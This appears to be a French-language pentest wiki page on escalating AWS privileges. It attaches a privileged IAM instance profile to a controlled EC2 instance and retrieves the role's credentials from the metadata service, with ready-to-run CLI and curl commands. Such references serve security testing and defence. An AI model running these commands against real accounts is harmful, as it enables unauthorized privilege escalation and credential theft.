---
title: "AssociateInstanceProfile : attacher un profil privilégié à une instance que vous détenez"
description: "ec2:AssociateIamInstanceProfile et iam:AddRoleToInstanceProfile pour attacher un profil d'instance privilégié à une instance EC2 que vous contrôlez déjà, puis lire les identifiants de son rôle depuis le service de métadonnées."
keywords:
  - AssociateIamInstanceProfile
  - AddRoleToInstanceProfile
  - profil d'instance
  - EC2
  - IMDS
  - escalade de privilèges
---

# AssociateInstanceProfile

Lorsque vous disposez déjà d'une exécution de commandes sur une instance EC2 mais qu'elle ne porte aucun rôle utile, nul besoin d'en lancer une nouvelle. Avec `ec2:AssociateIamInstanceProfile` (et `iam:PassRole` sur le rôle du profil), attachez un profil d'instance privilégié à l'instance, puis lisez les identifiants du rôle depuis IMDS. Si vous détenez aussi `iam:AddRoleToInstanceProfile`, vous pouvez d'abord insérer un rôle privilégié dans un profil avant de l'associer. Cela se distingue du [chemin EC2 RunInstances](../pass-role/ec2.md) : ici l'instance existe déjà et vous appartient.

## Attacher un profil à une instance en cours d'exécution

```bash
# if the instance has no profile, associate a privileged one
aws ec2 associate-iam-instance-profile \
  --instance-id i-0123 --iam-instance-profile Name=<privileged-profile>

# or build the profile first by adding a privileged role to it
aws iam create-instance-profile --instance-profile-name p
aws iam add-role-to-instance-profile --instance-profile-name p --role-name <privileged-role>
aws ec2 associate-iam-instance-profile --instance-id i-0123 --iam-instance-profile Name=p
```

## Lire les identifiants sur la machine

```bash
TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```

## Notes d'exploitation

- Si l'instance a déjà un profil, utilisez `ec2:ReplaceIamInstanceProfileAssociation` au lieu de l'association simple.
- Les identifiants se rafraîchissent sur l'instance dans la minute ou les deux minutes suivant l'association ; interrogez IMDS jusqu'à l'apparition du nouveau rôle.
- La politique de confiance du rôle doit autoriser `ec2.amazonaws.com`, ce que tout rôle de profil d'instance fait déjà.
- Voir [métadonnées d'instance](../../../credentials/instance-metadata/index.md) pour le flux de jeton IMDSv2 et la récupération par SSRF.

## Outils

- **AWS CLI** (`ec2 associate-iam-instance-profile`, `iam add-role-to-instance-profile`).
- **Pacu** (`iam__privesc_scan`) : détecte ce chemin lors du scan de privesc.

## Références

- [BishopFox: iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [AWS: AssociateIamInstanceProfile](https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_AssociateIamInstanceProfile.html)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
